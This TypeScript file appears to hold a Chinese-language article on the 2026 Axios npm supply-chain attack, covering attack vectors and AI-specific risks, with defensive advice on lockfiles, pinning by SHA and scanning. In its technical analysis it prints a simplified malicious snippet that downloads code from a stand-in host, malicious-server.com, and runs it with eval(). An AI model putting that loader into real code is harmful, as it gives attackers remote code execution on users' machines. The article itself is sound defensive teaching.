// AI Security: Supply Chain Attacks - From Axios to Open Source Dependency Crisis
// 2026-04-15

import { Article } from "../knowledge";

export const article: Article = {
  id: "ai-security-002",
  title: "AI 供应链安全：从 Axios 事件到开源依赖危机",
  category: "AI 伦理与安全",
  tags: ["供应链安全", "开源安全", "npm", "Axios", "软件供应链", "AI 安全", "依赖管理"],
  summary: "2026 年 3 月，广泛使用的 npm 包 Axios 遭受供应链攻击，波及 OpenAI、Google Cloud 等科技巨头。本文深入分析 AI 时代的软件供应链安全威胁、攻击向量、防御策略和最佳实践。",
  date: "2026-04-15",
  readTime: "15 min",
  level: "进阶",
  content: [
    {
      title: "1. 什么是软件供应链攻击？——从 Axios 事件说起",
      body: `2026 年 3 月 31 日，全球最受欢迎的 HTTP 客户端库 **Axios**（每周下载量超过 4500 万次）遭受供应链攻击。攻击者篡改了 npm 包版本 1.14.1，在其中植入了恶意脚本，使下载并执行该版本的用户设备（Windows、macOS、Linux）被远程访问。

这起事件的影响远超一般的开源安全事件：

- **OpenAI** 的 GitHub Actions 工作流在 macOS 应用签名过程中下载了恶意版本的 Axios，导致 ChatGPT Desktop、Codex App 等应用的签名证书暴露
- **Google Cloud** 确认朝鲜威胁行为者参与了此次攻击
- 大量 AI 项目和 CI/CD 管道受到影响

**软件供应链攻击**的核心概念很简单：不直接攻击目标系统，而是攻击目标系统所依赖的软件组件。当你的代码依赖一个被篡改的第三方库时，攻击者就间接获得了你系统的控制权。

在 AI 时代，供应链攻击的威胁被进一步放大：
- AI 项目通常依赖数百个第三方包
- 预训练模型本身就是「供应链」的一部分——模型权重可能被植入后门
- 微调数据集可能被投毒
- 推理框架和工具链同样面临风险`,
      mermaid: `graph TD
    A["攻击者"] --> B["篡改 npm 包"]
    B --> C["开发者下载依赖"]
    C --> D["CI/CD 管道执行"]
    D --> E["签名证书泄露"]
    D --> F["恶意代码注入"]
    E --> G["用户安装被篡改的应用"]
    F --> H["服务器被控制"]`,
    },
    {
      title: "2. AI 供应链攻击的主要向量",
      body: `AI 系统的供应链比传统软件更加复杂，攻击面也更大。以下是主要的攻击向量：

**npm/PyPI 包篡改**：这是最常见的攻击方式。攻击者通过以下方式实现：
- 接管维护者账号（如 Axios 事件中的维护者账号被入侵）
- 发布名称相似的恶意包（typosquatting），如 \`requets\` 替代 \`requests\`
- 污染依赖链，攻击某个包的依赖项，间接影响所有使用该包的开发者

**预训练模型后门**：随着 Hugging Face 等平台成为模型分发的主要渠道，模型权重文件（.bin、.safetensors）可能包含恶意代码。2024 年就发现过利用 pickle 反序列化执行任意代码的案例。

**数据集投毒**：训练数据是 AI 系统的「原料」。如果训练数据被投毒，模型的行为就会被操控。例如：
- 在训练集中植入特定的触发模式，使模型在遇到该模式时产生特定输出
- 修改标注数据，改变模型的决策边界

**推理框架漏洞**：vLLM、TGI、Ollama 等推理框架如果被植入后门，所有使用该框架的模型都会受到影响。

**Agent 工具链攻击**：AI Agent 通过 MCP（Model Context Protocol）调用外部工具。如果工具被篡改，Agent 的行为就会被操控。2026 年 4 月，黑客被发现通过泄露的 Claude Code 版本分发额外恶意软件。

**CI/CD 管道污染**：GitHub Actions、GitLab CI 等自动化管道如果配置不当，可能执行恶意代码。Axios 事件中，OpenAI 的 GitHub Actions 就是因为使用了浮动的标签（floating tag）而非具体的提交哈希，导致下载了恶意版本。`,
      table: {
        headers: ["攻击向量", "影响范围", "严重程度", "2026 年案例"],
        rows: [
          ["npm 包篡改", "所有使用该包的开发者", "极高", "Axios 供应链攻击"],
          ["预训练模型后门", "使用该模型的所有用户", "高", "Hugging Face pickle 漏洞"],
          ["数据集投毒", "基于该数据训练的模型", "高", "多起 LLM 训练数据污染"],
          ["推理框架漏洞", "所有使用该框架的部署", "极高", "vLLM 供应链审查"],
          ["MCP 工具篡改", "使用该工具的 Agent", "高", "Claude Code 泄露事件"],
          ["CI/CD 管道污染", "使用该管道的全部项目", "极高", "OpenAI Axios 事件"],
        ],
      },
    },
    {
      title: "3. Axios 事件深度技术分析",
      body: `让我们深入分析 Axios 供应链攻击的技术细节，从中汲取教训。

**攻击时间线**：

1. **账号入侵**：攻击者获取了 Axios 维护者的 npm 账号权限
2. **恶意发布**：3 月 31 日，恶意版本 1.14.1 被发布到 npm 注册表
3. **恶意代码**：该版本在构建脚本中植入了一个下载器，执行后会建立反向 Shell
4. **影响扩散**：4500 万周下载量意味着数十万开发者和项目在短时间内受到了影响
5. **发现与响应**：安全社区在数小时内发现了异常，npm 团队撤销了该版本

**OpenAI 受影响的原因分析**：

OpenAI 的 GitHub Actions 工作流存在以下配置错误：

- **使用浮动标签**：工作流引用了 Axios 的标签（如 \`v1.x\`）而非具体的提交哈希（commit hash）。这意味着每次运行都可能下载到不同的版本
- **未设置最小发布时间**：没有配置 \`minimumReleaseAge\`，导致新发布的包可以立即被安装，没有缓冲期来检测异常
- **高权限工作流**：GitHub Actions 工作流拥有 macOS 代码签名证书和公证材料的访问权限

**攻击的技术特征**：

\`\`\`javascript
// 恶意代码示例（简化版）
// 在 axios 1.14.1 的构建脚本中发现
const https = require('https');
https.get('https://malicious-server.com/payload', (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => eval(data)); // 远程代码执行
});
\`\`\`

这种攻击的精妙之处在于：
- 恶意代码隐藏在正常的构建脚本中
- 使用 \`eval()\` 执行远程下载的代码，实现无文件攻击
- 通过 HTTPS 通信，绕过网络监控
- 反向 Shell 使攻击者获得对受害者设备的完全控制`,
      warning: `关键教训：永远不要使用浮动标签引用第三方依赖！使用具体的版本号或提交哈希，才能在供应链出现问题时快速定位和修复。`,
    },
    {
      title: "4. 防御策略：构建纵深防御体系",
      body: `应对供应链攻击需要多层防护，不能依赖单一措施。以下是推荐的防御策略：

**依赖锁定（Dependency Locking）**：

使用 lockfile（package-lock.json、yarn.lock、pip freeze）锁定所有依赖的具体版本。这确保每次安装都使用完全相同的版本，避免意外下载到被篡改的新版本。

\`\`\`bash
# npm - 确保使用 lockfile
npm ci  # 从 lockfile 安装，而非 package.json

# Python - 使用 requirements.txt 或 poetry.lock
pip install -r requirements.txt
poetry install  # 使用 poetry.lock

# 定期检查 lockfile 与 package.json 的一致性
npm audit
\`\`\`

**版本固定（Pinning）**：

在 CI/CD 配置中，使用具体的版本号或提交哈希，而非浮动标签。

\`\`\`yaml
# ❌ 错误：浮动标签
- uses: actions/setup-node@v4
- run: npm install axios  # 可能安装到恶意版本

# ✅ 正确：具体版本
- uses: actions/setup-node@v4.0.2
- run: npm install axios@1.7.9  # 固定版本
\`\`\`

**最小发布时间检查**：

配置工具检查包的最小发布时间，避免立即安装刚发布的新版本。

\`\`\`json
// npm 配置 - 要求包发布至少 3 天后才能安装
{
  "minimumReleaseAge": "3d"
}
\`\`\`

**自动化安全扫描**：

\`\`\`bash
# npm 内置审计
npm audit

# Snyk - 商业级依赖扫描
snyk test

# Socket - 检测包行为变化
socket scan

# GitHub Dependabot - 自动更新和告警
# 在 .github/dependabot.yml 中配置
\`\`\`

**供应链完整性验证**：

- **Sigstore/cosign**：验证包签名和来源
- **npm provenance**：npm 提供的包来源证明
- **SBOM（Software Bill of Materials）**：生成软件物料清单，追踪所有依赖

**CI/CD 安全最佳实践**：

1. **最小权限原则**：GitHub Actions 只授予必要的权限
2. **隔离构建环境**：使用容器化构建环境，避免宿主机污染
3. **代码签名保护**：签名证书存储在安全的密钥管理服务中
4. **依赖缓存校验**：缓存的依赖也要校验哈希值
5. **定期轮换证书**：定期更新签名证书和 API 密钥`,
      code: [
        {
          lang: "yaml",
          code: `# .github/workflows/security.yml
# 安全的 GitHub Actions 配置示例

name: Secure Build

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read  # 最小权限

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1（固定 SHA）
      
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2（固定 SHA）
        with:
          node-version: '20'
          cache: 'npm'
      
      # 从 lockfile 安装，而非 package.json
      - run: npm ci
      
      # 依赖安全审计
      - run: npm audit --audit-level=high
      
      # Socket 供应链安全扫描
      - uses: SocketDev/actions/socket-dependency-scan@v1
        with:
          path: ./
      
      # Snyk 安全扫描
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - run: npm run build`,
          filename: "secure-workflow.yml",
        },
      ],
    },
    {
      title: "5. AI 特有的供应链安全挑战",
      body: `AI 系统引入了传统软件没有的供应链风险，需要特别的关注：

**模型供应链**：

预训练模型是现代 AI 应用的核心依赖。但模型文件（.bin、.safetensors）本质上就是可执行代码（通过 pickle 反序列化或类似机制），下载一个未知模型等同于运行未知代码。

2024 年，研究人员在 Hugging Face 上发现了多个包含恶意代码的模型文件。这些模型利用 pickle 的反序列化机制，在加载时执行任意 Python 代码。

防御措施：
- 使用 \`.safetensors\` 格式替代 pickle（不执行代码，仅加载张量数据）
- 验证模型来源（官方发布者、社区评分、下载量）
- 在沙箱中加载未知模型
- 使用 Hugging Face 的自动扫描功能检测恶意代码

**数据集供应链**：

训练数据的来源和质量直接影响模型行为。如果训练数据被投毒，模型可能：
- 在特定输入下产生错误输出（后门触发）
- 泄露训练数据中的敏感信息
- 表现出与预期不一致的行为

防御措施：
- 验证数据集来源和完整性（校验和、签名）
- 使用数据版本控制（DVC）追踪数据集变更
- 对训练数据进行统计异常检测
- 在验证集上检测模型行为异常

**Prompt 供应链**：

AI Agent 使用的 prompt 模板和系统提示词也可能成为攻击向量：
- 恶意的 prompt 模板可能诱导 Agent 执行未授权操作
- Prompt 注入攻击可以通过第三方内容（搜索结果、API 返回）注入恶意指令

防御措施：
- 将 prompt 模板纳入版本控制
- 对动态内容进行沙箱隔离
- 使用输入过滤和输出验证
- 实施最小权限的工具调用`,
      tip: `2026 年的最佳实践：在引入任何新的模型、数据集或 AI 工具之前，执行完整的供应链安全审查——包括来源验证、代码扫描、沙箱测试和行为监控。`,
    },
    {
      title: "6. 供应链安全工具生态",
      body: `2026 年，供应链安全工具生态已经相当成熟。以下是推荐的工具组合：

**依赖扫描与审计**：

| 工具 | 类型 | 功能 | 价格 |
|------|------|------|------|
| npm audit | 内置 | npm 依赖漏洞扫描 | 免费 |
| Snyk | 商业 | 全语言依赖扫描 + 修复建议 | 免费+付费 |
| Socket | 商业 | 检测包行为变化和供应链风险 | 付费 |
| Dependabot | 内置 | 自动检测过时依赖并创建 PR | 免费 |
| Renovate | 开源 | 自动化依赖更新 | 免费 |

**代码签名与验证**：

| 工具 | 功能 | 平台 |
|------|------|------|
| Sigstore/cosign | 容器和软件签名 | 通用 |
| npm provenance | npm 包来源证明 | npm |
| in-toto | 供应链完整性框架 | 通用 |

**CI/CD 安全**：

| 工具 | 功能 | 集成 |
|------|------|------|
| GitHub CodeQL | 代码安全扫描 | GitHub |
| TruffleHog | 密钥泄露检测 | GitHub Actions |
| StepSecurity Harden-Runner | GitHub Actions 安全加固 | GitHub |

**AI 特定工具**：

| 工具 | 功能 | 适用场景 |
|------|------|---------|
| Hugging Face 扫描 | 模型文件恶意代码检测 | 模型下载 |
| Garak | LLM 安全评估 | 模型测试 |
| Promptfoo | Prompt 安全测试 | Agent 开发 |
| Rebuff | Prompt 注入防护 | Agent 运行时 |

**推荐的工具组合**：

对于 AI 项目，建议采用以下工具组合：
1. **npm audit + Snyk** — 依赖漏洞扫描
2. **Socket** — 供应链行为监控
3. **Dependabot** — 自动依赖更新
4. **Sigstore** — 包签名验证
5. **Garak** — LLM 安全评估
6. **Rebuff** — Prompt 注入防护`,
    },
    {
      title: "7. 未来展望与行动建议",
      body: `软件供应链安全正在从「事后补救」转向「主动防御」。以下是 AI 时代的几个关键趋势：

**趋势一：AI 驱动的供应链安全**

AI 正在被用于检测和防御供应链攻击：
- 使用 ML 模型分析包的发布模式，检测异常行为
- 自动化依赖审计，识别潜在的供应链风险
- 预测性分析，提前发现可能被攻击的包

**趋势二：标准化与合规**

- **SLSA（Supply chain Levels for Software Artifacts）**：Google 推出的供应链安全框架，正在成为行业标准
- **EU AI Act**：要求高风险 AI 系统提供完整的供应链透明度报告
- **NIST AI RMF**：美国国家标准与技术研究院的 AI 风险管理框架

**趋势三：零信任供应链**

就像零信任网络一样，零信任供应链假设每个依赖都可能是恶意的：
- 每个依赖都必须经过验证才能使用
- 持续监控依赖的行为变化
- 快速响应供应链安全事件

**给 AI 开发者的行动建议**：

1. **立即行动**：检查项目中的所有依赖，固定版本号，启用自动化审计
2. **短期（1 周内）**：配置 GitHub Dependabot 或 Renovate，设置 CI/CD 安全扫描
3. **中期（1 个月内）**：实施 Sigstore 签名验证，引入 Snyk 或 Socket 进行供应链监控
4. **长期（持续）**：建立供应链安全文化，定期审查依赖，参与开源社区安全建设

**一句话总结**：在 AI 时代，供应链安全不是可选项，而是生存必需品。你的代码再安全，如果依赖的库被攻破，一切都是徒劳。`,
      warning: `不要等到被攻击才想起供应链安全！今天花 1 小时配置依赖审计和自动更新，比事后花 1 个月修复被入侵的系统要好得多。`,
    },
  ],
};
